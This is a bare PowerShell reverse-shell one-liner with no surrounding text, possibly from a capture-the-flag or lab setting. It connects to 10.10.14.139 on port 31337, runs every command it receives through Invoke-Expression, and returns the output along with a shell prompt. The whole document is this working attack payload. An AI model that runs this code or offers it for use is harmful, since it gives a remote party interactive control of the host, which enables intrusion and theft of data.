$a = New-Object System.Net.Sockets.TCPClient('10.10.14.139',31337);$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($i = $b.Read($c, 0, $c.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $i);$f = (iex $d 2>&1 | Out-String );$g = $f + 'PS ' + (pwd).Path + '> ';$e = ([text.encoding]::ASCII).GetBytes($g);$b.Write($e,0,$e.Length);$b.Flush()};$a.Close()
